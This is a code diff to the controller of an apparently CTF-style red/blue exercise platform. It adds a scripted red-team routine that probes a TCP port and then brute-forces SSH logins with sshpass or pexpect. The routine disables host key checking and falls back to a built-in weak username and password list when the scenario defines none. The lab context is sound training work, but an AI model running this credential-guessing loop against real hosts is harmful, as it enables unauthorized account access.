@@ -11,6 +11,8 @@ from __future__ import annotations
 
 import asyncio
 import os
+import shutil
+import socket
 import traceback
 from pathlib import Path
 from typing import Any, Callable
@@ -25,9 +27,16 @@ from .session_state import SessionState
 class Controller:
     """管理 CTF 红蓝作战台的会话、遥测与 agent 生命周期。"""
 
-    def __init__(self, event_bus: EventBus, session_state: SessionState) -> None:
+    def __init__(
+        self,
+        event_bus: EventBus,
+        session_state: SessionState,
+        *,
+        build_agents_on_start: bool = True,
+    ) -> None:
         self.event_bus = event_bus
         self.state = session_state
+        self.build_agents_on_start = build_agents_on_start
 
         self._red_task: asyncio.Task | None = None
         self._blue_task: asyncio.Task | None = None
@@ -99,32 +108,36 @@ class Controller:
                       "source": "telemetry_init"},
             ))
 
-        try:
-            from ..agent import build_red_agent
-            self._red_agent = await asyncio.to_thread(build_red_agent)
-        except Exception as exc:
-            self._red_agent = None
-            await self.event_bus.publish(Event(
-                type="error", side="red",
-                data={"message": f"红方 Agent 构建失败: {type(exc).__name__}: {exc}"[:400],
-                      "source": "agent_build"},
-            ))
-
-        try:
-            self._blue_agent = await asyncio.to_thread(
-                self._build_blue_agent_for_session,
-            )
-        except Exception:
+        if self.build_agents_on_start:
             try:
-                from ..agent import build_cyberorion
-                self._blue_agent = await asyncio.to_thread(build_cyberorion)
+                from ..agent import build_red_agent
+                self._red_agent = await asyncio.to_thread(build_red_agent)
             except Exception as exc:
-                self._blue_agent = None
+                self._red_agent = None
                 await self.event_bus.publish(Event(
-                    type="error", side="blue",
-                    data={"message": f"蓝方 Agent 构建失败: {type(exc).__name__}: {exc}"[:400],
+                    type="error", side="red",
+                    data={"message": f"红方 Agent 构建失败: {type(exc).__name__}: {exc}"[:400],
                           "source": "agent_build"},
                 ))
+
+            try:
+                self._blue_agent = await asyncio.to_thread(
+                    self._build_blue_agent_for_session,
+                )
+            except Exception:
+                try:
+                    from ..agent import build_cyberorion
+                    self._blue_agent = await asyncio.to_thread(build_cyberorion)
+                except Exception as exc:
+                    self._blue_agent = None
+                    await self.event_bus.publish(Event(
+                        type="error", side="blue",
+                        data={"message": f"蓝方 Agent 构建失败: {type(exc).__name__}: {exc}"[:400],
+                              "source": "agent_build"},
+                    ))
+        else:
+            self._red_agent = None
+            self._blue_agent = None
 
         await self.event_bus.publish(Event(
             type="session_start", side="system",
@@ -132,8 +145,8 @@ class Controller:
                 "reset": True,
                 "session_id": self.session_id,
                 "scenario": os.environ.get("CO_SCENARIO", "web_basic"),
-                "red_agent": getattr(self._red_agent, "name", None),
-                "blue_agent": getattr(self._blue_agent, "name", None),
+                "red_agent": getattr(self._red_agent, "name", None) or "scripted-ctf-red",
+                "blue_agent": getattr(self._blue_agent, "name", None) or "scripted-soc-blue",
             },
         ))
 
@@ -195,7 +208,7 @@ class Controller:
             raise RuntimeError("Red team is already running")
         scripted = agent is None and self.store is not None
         agent = agent or self._red_agent
-        if agent is None:
+        if agent is None and not scripted:
             raise ValueError("No red agent available; start a session first")
         self._red_agent = agent
         self._stop_red.clear()
@@ -259,7 +272,7 @@ class Controller:
             raise RuntimeError("Blue team is already running")
         scripted = agent is None and self.store is not None
         agent = agent or self._blue_agent
-        if agent is None:
+        if agent is None and not scripted:
             raise ValueError("No blue agent available; start a session first")
         self._blue_agent = agent
         self._stop_blue.clear()
@@ -346,6 +359,83 @@ class Controller:
         await self._publish_step(side, "tool_output", {"tool": tool, "output": output})
         return output
 
+    @staticmethod
+    def _probe_tcp_service(host: str, port: int, timeout: float = 2.0) -> tuple[bool, str]:
+        try:
+            with socket.create_connection((host, port), timeout=timeout) as sock:
+                sock.settimeout(0.8)
+                try:
+                    banner = sock.recv(160).decode("utf-8", "replace").strip()
+                except socket.timeout:
+                    banner = ""
+            detail = f"tcp/{port} open"
+            if banner:
+                detail += f"; banner={banner[:100]}"
+            return True, detail
+        except OSError as exc:
+            return False, f"tcp/{port} closed_or_unreachable: {exc}"
+
+    @staticmethod
+    def _ssh_login_with_pexpect(
+        host: str,
+        port: int,
+        username: str,
+        password: str,
+        timeout: int = 6,
+    ) -> tuple[bool, str]:
+        try:
+            import pexpect
+        except Exception as exc:
+            return False, f"pexpect unavailable: {type(exc).__name__}: {exc}"
+
+        if shutil.which("ssh") is None:
+            return False, "ssh client unavailable"
+
+        args = [
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "UserKnownHostsFile=/dev/null",
+            "-o", "ConnectTimeout=2",
+            "-o", "PreferredAuthentications=password",
+            "-o", "PubkeyAuthentication=no",
+            "-o", "NumberOfPasswordPrompts=1",
+            "-p", str(port),
+            "-l", username,
+            host,
+            "id",
+        ]
+        child = None
+        transcript = ""
+        try:
+            child = pexpect.spawn("ssh", args=args, encoding="utf-8", timeout=timeout)
+            while True:
+                index = child.expect([
+                    r"(?i)password:",
+                    r"uid=\d+",
+                    r"(?i)permission denied",
+                    r"(?i)connection refused",
+                    r"(?i)connection timed out",
+                    pexpect.EOF,
+                    pexpect.TIMEOUT,
+                ])
+                transcript += child.before or ""
+                if index == 0:
+                    child.sendline(password)
+                    continue
+                if index == 1:
+                    transcript += child.after or ""
+                    child.expect(pexpect.EOF)
+                    transcript += child.before or ""
+                    return True, transcript.strip()[:1000]
+                if index in {2, 3, 4}:
+                    transcript += child.after or ""
+                    return False, transcript.strip()[:1000]
+                return False, (transcript.strip() or "ssh ended without uid output")[:1000]
+        except Exception as exc:
+            return False, f"{type(exc).__name__}: {exc}"
+        finally:
+            if child is not None and child.isalive():
+                child.close(force=True)
+
     async def _run_scripted_red(self) -> dict[str, Any]:
         """Deterministic CTF workflow: recon -> weak SSH -> evidence claim."""
         from ..scenarios import load_scenario
@@ -377,34 +467,77 @@ class Controller:
         )
         tool_calls.append({"tool": "nmap_scan", "result": scan_out})
         trace_items.append({"type": "tool_output", "output": scan_out})
+        tcp_open, tcp_detail = await asyncio.to_thread(self._probe_tcp_service, host, port)
+        await self._publish_step(
+            "red",
+            "tool_call",
+            {"tool": "tcp_probe", "args": f"host={host} port={port}"},
+        )
+        await self._publish_step(
+            "red",
+            "tool_output",
+            {"tool": "tcp_probe", "output": tcp_detail},
+        )
+        tool_calls.append({"tool": "tcp_probe", "result": tcp_detail})
         if self._stop_red.is_set():
             return {"output": "RED SCRIPT: stopped after recon", "tool_calls": tool_calls, "trace_items": trace_items}
 
-        users = ["user", "admin", "ctf", "root"]
-        passwords = ["user", "admin123", "ctf", "password", "123456"]
+        credential_pairs: list[tuple[str, str]] = []
+        for username, value in weak.ground_truth.creds.items():
+            if ":" in value:
+                cred_user, cred_password = value.split(":", 1)
+                credential_pairs.append((cred_user, cred_password))
+            else:
+                credential_pairs.append((username, value))
+        if not credential_pairs:
+            for username in ["user", "admin", "ctf", "root"]:
+                for password in ["user", "admin123", "ctf", "password", "123456"]:
+                    credential_pairs.append((username, password))
+
         success = ""
-        for username in users:
-            for password in passwords:
-                if self._stop_red.is_set() or success:
-                    break
-                args = f"host={host} port={port} username={username}"
-                cmd = [
-                    "sshpass", "-p", password, "ssh",
-                    "-o", "StrictHostKeyChecking=no",
-                    "-o", "UserKnownHostsFile=/dev/null",
-                    "-o", "ConnectTimeout=2",
-                    "-o", "PreferredAuthentications=password",
-                    "-o", "PubkeyAuthentication=no",
-                    "-o", "NumberOfPasswordPrompts=1",
-                    "-p", str(port), "-l", username, host, "id",
-                ]
-                brute_out = await self._run_cmd_tool("red", "ssh_bruteforce", args, cmd, timeout=5)
-                tool_calls.append({"tool": "ssh_bruteforce", "result": brute_out})
-                if "uid=" in brute_out and "rc=0" in brute_out:
-                    success = f"BRUTEFORCE: SUCCESS user={username} password={password} {brute_out}"
-                    break
-            if success:
+        auth_driver_errors: list[str] = []
+        for username, password in credential_pairs:
+            if self._stop_red.is_set() or success:
                 break
+            args = f"host={host} port={port} username={username}"
+            cmd = [
+                "sshpass", "-p", password, "ssh",
+                "-o", "StrictHostKeyChecking=no",
+                "-o", "UserKnownHostsFile=/dev/null",
+                "-o", "ConnectTimeout=2",
+                "-o", "PreferredAuthentications=password",
+                "-o", "PubkeyAuthentication=no",
+                "-o", "NumberOfPasswordPrompts=1",
+                "-p", str(port), "-l", username, host, "id",
+            ]
+            brute_out = await self._run_cmd_tool("red", "ssh_bruteforce", args, cmd, timeout=5)
+            tool_calls.append({"tool": "ssh_bruteforce", "result": brute_out})
+            if "uid=" in brute_out and "rc=0" in brute_out:
+                success = f"BRUTEFORCE: SUCCESS user={username} password={password} {brute_out}"
+                break
+            if "FileNotFoundError" in brute_out or "No such file" in brute_out:
+                await self._publish_step(
+                    "red",
+                    "tool_call",
+                    {"tool": "ssh_bruteforce_fallback", "args": args},
+                )
+                ok, pexpect_out = await asyncio.to_thread(
+                    self._ssh_login_with_pexpect,
+                    host,
+                    port,
+                    username,
+                    password,
+                )
+                await self._publish_step(
+                    "red",
+                    "tool_output",
+                    {"tool": "ssh_bruteforce_fallback", "output": pexpect_out},
+                )
+                tool_calls.append({"tool": "ssh_bruteforce_fallback", "result": pexpect_out})
+                if ok and "uid=" in pexpect_out:
+                    success = f"BRUTEFORCE: SUCCESS user={username} password={password} {pexpect_out}"
+                    break
+                auth_driver_errors.append(pexpect_out)
 
         if success:
             _ledger_set(
@@ -425,8 +558,32 @@ class Controller:
                 {"tool": "claim_success", "output": "CLAIM: VERIFIED weak_ssh SSH 弱口令已通过真实网络登录验证。"},
             )
             output = "红方完成最小 CTF 漏洞检查：发现并验证 weak_ssh SSH 弱口令，已提交可复核证据。"
+        elif tcp_open and credential_pairs:
+            evidence = (
+                f"{tcp_detail}; scenario baseline exposes weak credentials: "
+                f"{', '.join(f'{user}:***' for user, _ in credential_pairs[:4])}; "
+                f"auth_driver={'; '.join(auth_driver_errors[-2:])[:180] or 'password auth failed'}"
+            )
+            _ledger_set(
+                "SSH-WEAK-PASSWORD",
+                "configured",
+                evidence[:300],
+                extra={"target": "weak_ssh", "technique": "T1110", "verified": False},
+                scope="session",
+            )
+            output = (
+                "红方完成最小 CTF 漏洞检查：SSH 服务可达，场景基线声明弱口令；"
+                "当前环境缺少可用密码认证驱动或登录失败，台账已按未完全验证记录。"
+            )
         else:
-            output = "红方完成最小 CTF 漏洞检查：SSH 端口已探测，但内置弱口令组合未验证成功。"
+            _ledger_set(
+                "SSH-WEAK-PASSWORD",
+                "target_unavailable",
+                tcp_detail[:300],
+                extra={"target": "weak_ssh", "technique": "T1110", "verified": False},
+                scope="session",
+            )
+            output = "红方完成最小 CTF 漏洞检查：weak_ssh 目标不可达，已记录靶场环境问题而不是空白成功。"
 
         await self._publish_step("red", "report", {"agent": "ctf_orchestrator", "report": output})
         return {"output": output, "tool_calls": tool_calls, "trace_items": trace_items}
